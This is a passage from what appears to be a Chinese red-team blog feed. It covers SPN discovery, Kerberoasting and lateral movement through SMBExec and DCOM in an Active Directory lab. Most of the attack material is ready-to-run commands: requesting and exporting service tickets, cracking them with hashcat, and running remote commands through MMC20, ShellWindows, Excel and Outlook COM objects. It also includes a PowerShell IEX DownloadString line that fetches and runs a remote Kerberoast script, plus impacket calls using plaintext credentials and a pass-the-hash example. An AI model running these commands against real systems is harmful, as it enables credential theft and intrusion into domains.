&quot;Import-Module .\Discover-PSMSSQLServers.ps1;Discover-PSMSSQLServers&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>扫描域中所有的 SPN 信息</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Discover-PSInterestingServices.ps1Discover-PSInterestingServices或者PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSInterestingServices.ps1;Discover-PSInterestingServices&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h4><p>kerberoast 工具包里的 GetUserSPNs.ps1，可以帮助我们发现仅与用户帐户相关联的服务。</p><p>kerberoast 下载地址：<a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;GetUserSPNs.ps1或者PowerShell -Exec bypass -File GetUserSPNs.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>kerberoast 工具包里的 GetUserSPNs.vbs 也能实现相同的功能</p><pre class="line-numbers language-none"><code class="language-none">cscript.exe GetUserSPNs.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="PowerShellery"><a href="#PowerShellery" class="headerlink" title="PowerShellery"></a>PowerShellery</h4><p>PowerShellery 工具包里包含了 Get-SPN，可以为各种服务收集 SPN</p><p>PowerShellery 下载地址：<a href="https://github.com/nullbind/Powershellery">https://github.com/nullbind/Powershellery</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-SPN.psm1Get-SPN -type service -search *或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search *&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>结果也可以转换为表格的形式，以便于浏览</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-SPN.psm1Get-SPN -type service -search * -List yes或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search * -List yes&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>另外一个 Get-DomainSpn.psm1 脚本可以用来获取 UserSID、服务和实际用户</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-DomainSpn.psm1Get-DomainSpn或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-DomainSpn.psm1;Get-DomainSpn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><p>Impacket 下载地址：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>上面的工具都是在域内的机器里扫描 SPN 的，利用 impacket 工具包下的 GetUserSPNs.py 可以在非域主机中扫描目标的 SPN</p><pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -dc-ip 192.168.7.7 teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210906144640.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、kerberoast"><a href="#2、kerberoast" class="headerlink" title="2、kerberoast"></a>2、kerberoast</h2><p>kerberoast 是一种针对 Kerberos 协议的利用方式，在因为需要使用某个特定资源而向 TGS 发送 Kerberos 服务票据的请求时，用户首先需要使用具有有效身份权限的 TGT 向 TGS 请求相应服务的票据。</p><p>当 TGT 被验证有效且具有该服务的权限时，TGS 会向用户发送一张票据。该票据使用与 SPN 相关联的计算机服务账号的 NTLM Hash（RC4_HMAC_MD5），就是说，RT 会通过 Kerberoast 尝试使用不同的 NTLM Hash 来打开该 Kerberos 票据，如果 RT 使用的 NTLM Hash 是正确的，Kerberos 票据就会被打开，而该 NTLM Hash 对应于该计算机服务账号的密码。</p><p>kerberoast 的利用思路：</p><p>1、查询 SPN 寻找在 Users 下并且是高权限域用户的服务</p><p>2、请求并导出 TGS</p><p>3、对 TGS 进行爆破</p><p>这里以 MSSQL 服务为例，并尝试破解该服务的票据</p><p>手动注册 SPN</p><pre class="line-numbers language-none"><code class="language-none">setspn -A MSSQLSvc&#x2F;DBSRV.teamssix.com:1433 test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看用户所对应的 SPN</p><pre class="line-numbers language-none"><code class="language-none">setspn -L teamssix.com\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用 adsiedit.msc 查看用户 SPN 及其他高级属性</p><p>为用户配置指定服务的登录权限，gpedit.msc 打开本地组策略编辑器，找到以下路径，将用户添加进去，例如这里添加的用户为 test</p><pre class="line-numbers language-none"><code class="language-none">\计算机配置\Windows 设置\安全设置\本地策略\用户权限分配\作为服务登录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为 Kerberos 协议的默认加密方式是 AES256_HMAC，而通过 tgsreperack.py 脚本无法破解该加密方式，因此我们可以通过组策略将加密方式设置为 RC_HMAC_MD5</p><p>在本地组策略编辑器中，找到以下路径，将加密方式设置为 RC_HMAC_MD5</p><pre class="line-numbers language-none"><code class="language-none">\计算机配置\Windows 设置\安全设置\本地策略\安全选项\网络安全：配置 Kerberos 允许的加密类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>请求指定 SPN 的服务票据</p><pre class="line-numbers language-none"><code class="language-none">$SPNName &#x3D; &#39;MSSQLSvc&#x2F;DBSRV.teamssix.com&#39;Add-Type -AssemblyNAme System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者请求所有服务的服务票据</p><pre class="line-numbers language-none"><code class="language-none">Add-Type -AssemblyName System.IdentityModel  setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以使用 klist 查看本地缓存的票证，看看有没有新的票据</p><p>之后在 mimikatz 中执行如下命令，将内存中的票据导出</p><pre class="line-numbers language-none"><code class="language-none">kerberos::list &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以不使用 mimikatz，使用 powershell 脚本导出支持 hashcat 破解的格式</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;EmpireProject&#x2F;Empire&#x2F;6ee7e036607a62b0192daed46d3711afc65c3921&#x2F;data&#x2F;module_source&#x2F;credentials&#x2F;Invoke-Kerberoast.ps1&#39;);Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 Rubeus 获取票据</p><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe kerberoast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用 impacket 获取票据</p><pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -request -dc-ip 192.168.7.7 -debug teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210907113159.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>将 MSSQL 服务所对应的票据复制到有 kerberoast 的机器上，之后用 kerberoast 中的 tgsreperack.py 脚本破解票据的 NTLM Hash</p><p>Kerberoast 脚本下载地址：<a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><pre class="line-numbers language-none"><code class="language-none">python tgsrepcrack.py password.txt mssql.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 hashcat 破解 powershell 脚本、Rubeus、impacket 获取到的服务票据</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 &#x2F;tmp&#x2F;hash.txt &#x2F;tmp&#x2F;password.list -o found.txt --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210907113300.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/23a4e8978a30">https://www.jianshu.com/p/23a4e8978a30</a></p><p><a href="https://y4er.com/post/kerberos-kerberoasting-spn">https://y4er.com/post/kerberos-kerberoasting-spn</a></p><p><a href="https://www.freebuf.com/articles/web/280406.html">https://www.freebuf.com/articles/web/280406.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1170758">https://cloud.tencent.com/developer/article/1170758</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/11707302.html">https://www.cnblogs.com/zpchcbd/p/11707302.html</a></p><p><a href="https://blog.csdn.net/wulantian/article/details/42418231">https://blog.csdn.net/wulantian/article/details/42418231</a></p><p><a href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;h3 id=&quot;SPN&quot;&gt;&lt;a href=&quot;#SPN&quot; class=&quot;headerlink&quot; title=&quot;SPN&quot;&gt;&lt;/a&gt;SP</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】23、SMBExec 与 DCOM 的使用</title>
    <link href="https://www.teamssix.com/210904-110701.html"/>
    <id>https://www.teamssix.com/210904-110701.html</id>
    <published>2021-09-04T03:07:01.000Z</published>
    <updated>2021-09-04T04:02:03.765Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、SMBExec"><a href="#1、SMBExec" class="headerlink" title="1、SMBExec"></a>1、SMBExec</h2><p>利用 SMBExec 可以通过文件共享（admin$、c$、ipc$、d$）在远程系统中执行命令，它的工作方式类似于 PsExec</p><h3 id="C-版"><a href="#C-版" class="headerlink" title="C++ 版"></a>C++ 版</h3><p>C++ 版项目地址：<a href="https://github.com/sunorr/smbexec">https://github.com/sunorr/smbexec</a></p><p>一看这个项目是 8 年前上传的了，然后试了用 VS2019 没编译成功，而且目前各大杀软也都查杀这个工具了，所以这个就不看了，直接看 impacket 里的同类工具。</p><h3 id="impacket-版"><a href="#impacket-版" class="headerlink" title="impacket 版"></a>impacket 版</h3><p>在 impacket 工具包里包含了 smbexec.py 工具，使用起来也很简单。</p><pre class="line-numbers language-none"><code class="language-none">python3 smbexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902153131.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="Linux-跨平台-Windows-远程命令执行"><a href="#Linux-跨平台-Windows-远程命令执行" class="headerlink" title="Linux 跨平台 Windows 远程命令执行"></a>Linux 跨平台 Windows 远程命令执行</h3><p>smbexec 工具包下载地址：<a href="https://github.com/brav0hax/smbexec">https://github.com/brav0hax/smbexec</a></p><p>这里安装以 Kali 为例</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;brav0hax&#x2F;smbexec.gitcd smbexec&#x2F;chmod +x install.shsudo .&#x2F;install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>安装时需要选择操作系统，根据自己情况选择就行，如果是 Kali 就选择 Debain，然后选择安装目录，直接回车默认 /opt 目录即可。</p><p>安装完后，在终端里输入 smbexec 就会显示 smbexec 的主菜单，分别如下：</p><pre class="line-numbers language-none"><code class="language-none">1. System Enumeration   &#x2F;&#x2F; 获取系统信息2. System Exploitation  &#x2F;&#x2F; 执行系统命令3. Obtain Hashes        &#x2F;&#x2F; 获取系统哈希4. Options              &#x2F;&#x2F; 一些其他操作5. Exit                 &#x2F;&#x2F; 退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选择菜单 1 System Enumeration 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Create a host list                 &#x2F;&#x2F; 扫描目标 IP 段中存活的主机2. Check systems for Domain Admin     &#x2F;&#x2F; 获取目标系统中的管理员3. Check systems for logged in users  &#x2F;&#x2F; 获取当前登录目标系统的用户4. Check systems for UAC              &#x2F;&#x2F; 获取目标系统 UAC 的状态5. Enumerate Shares                   &#x2F;&#x2F; 获取目标系统中的网络共享目录6. File Finder                        &#x2F;&#x2F; 搜索目标系统中的敏感文件7. Remote login validation            &#x2F;&#x2F; 获取目标系统中远程登录的用户8. Main menu                          &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选择菜单 2 System Exploitation 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Create an executable and rc script    &#x2F;&#x2F; 生成一个 meterpreter Payload 并在目标系统中运行它2. Disable UAC                           &#x2F;&#x2F; 关闭远程主机的 UAC3. Enable UAC                            &#x2F;&#x2F; 开启远程主机的 UAC4. Execute Powershell                    &#x2F;&#x2F; 执行一个 PowerShell 脚本5. Get Shell                             &#x2F;&#x2F; 使用基于 PsExec 的方式获得目标系统的 Shell6. In Memory Meterpreter via Powershell  &#x2F;&#x2F; 通过 PowerShell 在内存中插入 Meterpreter Payload7. Remote system access                  &#x2F;&#x2F; 远程访问系统8. Main menu                             &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选择菜单 3 Obtain Hashes 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Domain Controller            &#x2F;&#x2F; 获取域控哈希2. Workstation &amp; Server Hashes  &#x2F;&#x2F; 获取本地哈希3. Main menu                    &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>选择菜单 4 Options 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Save State            &#x2F;&#x2F; 保存当前状态2. Load State            &#x2F;&#x2F; 加载以前保存的状态3. Set Thread Count      &#x2F;&#x2F; 设置线程数4. Generate SSL Cert     &#x2F;&#x2F; 生成 SSL 证书5. Enter Stealth Mode    &#x2F;&#x2F; 进入安静模式6. About                 &#x2F;&#x2F; 关于7. Main menu             &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取目标系统 UAC 的状态</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902163458.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>获取目标系统中的网络共享目录</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902163631.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>获取本地哈希</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902161205.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、DCOM-在远程系统中的使用"><a href="#2、DCOM-在远程系统中的使用" class="headerlink" title="2、DCOM 在远程系统中的使用"></a>2、DCOM 在远程系统中的使用</h2><p>COM 即组件对象模型 (Component Object Model，COM) ，是基于 Windows 平台的一套组件对象接口标准，由一组构造规范和组件对象库组成。</p><p>COM 是许多微软产品和技术如 Windows 媒体播放器和 Windows Server 的基础。</p><p>DCOM （分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，DCOM 是 COM（组件对象模型）的扩展。</p><p>它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上，利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。</p><p>攻击者可使用 DCOM 进行横向移动，通过 DCOM 攻击者可在拥有适当权限的情况下通过 Office 应用程序以及包含不安全方法的其他 Windows 对象远程执行命令。</p><p>使用 DCOM 进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管 COM 服务器端的软件。例如我们滥用 ShellBrowserWindow COM 对象，那么就会在远程主机的现有 explorer.exe 进程中执行。</p><p>对攻击者而言，这无疑能够增强隐蔽性，由于有大量程序都会向 DCOM 公开方法，因此防御者较难以监测所有程序。</p><h3 id="在本地通过-DCOM-执行命令"><a href="#在本地通过-DCOM-执行命令" class="headerlink" title="在本地通过 DCOM 执行命令"></a>在本地通过 DCOM 执行命令</h3><p>1、获取 DCOM 程序列表</p><p>Get-CimInstance 是 PowerShell 3.0 以上的版本自带的，因此只有 Windows Server 2012 及以上的操作系统才会自带 Get-CimInstance 命令</p><pre class="line-numbers language-none"><code class="language-none">Get-CimInstance Win32_DCOMApplication<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Windows 7 和 Windows Server 2008 中可以使用 Get-WmiObject 替代 Get-CimInstance</p><pre class="line-numbers language-none"><code class="language-none">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、使用 DCOM 执行任意命令</p><p>在 DCOM 程序列表中有个 MMC Application Class（MMC20.Application），这个 COM 对象可以编程 MMC 管理单元操作的组件脚本。</p><p>在本地以管理员权限启动一个 PowerShell，并执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得COM对象的实例后，还可以执行如下命令枚举这个 COM 对象中的不同方法和属性</p><pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView | Get-Member<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 MMC20.Application 中有个 ExecuteShellCommand 方法，我们可以拿它来执行命令，比如启动个计算器</p><pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902171015.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>除了 MMC20.Application 还有 ShellWindows、ShellBrowserWindow、Excel.Application 以及 Outlook.Application 等等可以被我们利用。</p><h3 id="使用-DCOM-在远程主机上执行命令"><a href="#使用-DCOM-在远程主机上执行命令" class="headerlink" title="使用 DCOM 在远程主机上执行命令"></a>使用 DCOM 在远程主机上执行命令</h3><p>在使用该方法时，需要具备以下条件：</p><ul><li>具有本地管理员权限的 PowerShell</li><li>需要关闭目标系统的防火墙。</li><li>在远程主机上执行命令时，必须使用域管的 administrator 账户或者在目标主机上具有管理员权限的账户</li></ul><p>1、调用 MMC20.Application 远程执行命令</p><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.7.7&quot;))$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)或者[Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.7.7&quot;)).Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902175722.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>2、调用 ShellWindows 远程执行命令</p><pre class="line-numbers language-none"><code class="language-none">$com&#x3D;[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;))$com.item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)或者[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902175207.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>以上这两种方法均适用于Windows 7、Windows 10、Windows Server 2008、Windows Server 2016 的系统。</p><p>除了 MMC20.Application 和 ShellWindows，还有以下这几种 DCOM 对象可以被利用。</p><p>3、调用 Excel.Application 远程执行命令</p><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;192.168.7.7&quot;))$com.DisplayAlerts &#x3D; $false$com.DDEInitiate(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4、调用 ShellBrowserWindow 远程执行命令</p><blockquote><p>适用于 Windows 10 和 Windows Server 2012 R2 等版本的系统</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.7.7&quot;))$com.Document.Application.shellExecute(&quot;calc.exe&quot;)或者[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.3.144&quot;)).Document.Application.shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>5、调用 Visio.Application 远程执行命令</p><blockquote><p>前提是目标安装了 Visio</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.168.7.7&quot;))$com.[0].Document.Application.shellExecute(&quot;calc.exe&quot;)或者[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.168.7.7&quot;)).[0].Document.Application.shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>6、调用 Outlook.Application 远程执行命令</p><blockquote><p>前提是目标安装了 Outlook</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192.168.7.7&quot;))$com.createObject(&quot;Shell.Application&quot;).shellExecute(&quot;192.168.7.7&quot;)或者[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192.168.7.7&quot;)).createObject(&quot;Shell.Application&quot;).shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="dcomexec-py-脚本"><a href="#dcomexec-py-脚本" class="headerlink" title="dcomexec.py 脚本"></a>dcomexec.py 脚本</h3><p>Impacket 工具包里也提供了 DCOM 的利用脚本，该脚本可以提供一个类似于 wmiexec.py 脚本的半交互式 shell，不过使用的是 DCOM</p><p>dcomexec.py 脚本目前支持 MMC20.Application、ShellWindows 和 ShellBrowserWindow 对象。</p><pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者只执行一条命令</p><pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7 ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果只知道 hash 也可以用 hash 去连接</p><pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator@192.168.7.7 -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210904110328.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://cloud.tencent.com/developer/article/1752145">https://cloud.tencent.com/developer/article/1752145</a></p><p><a href="https://www.freebuf.com/articles/network/261454.html">https://www.freebuf.com/articles/network/261454.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、SMBExec&quot;&gt;&lt;a href=&quot;#1、SMBExec&quot; class=&quot;headerlink&quot; title=&quot;1、SMBExec&quot;&gt;&lt;/a&gt;1、SMBExec&lt;/h2&gt;&lt;p&gt;利用 SMBExec 可以通过文件共享（admin$、c$、ipc$、d$）在远程系</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】22、PsExec 和 WMI 的使用</title>
    <link href="https://www.teamssix.com/210902-132326.html"/>
    <id>https://www.teamssix.com/210902-132326.html</id>
    <published>2021-09-02T05:23:26.000Z</published>
    <updated>2021-09-02T06:37:58.644Z</updated>
    
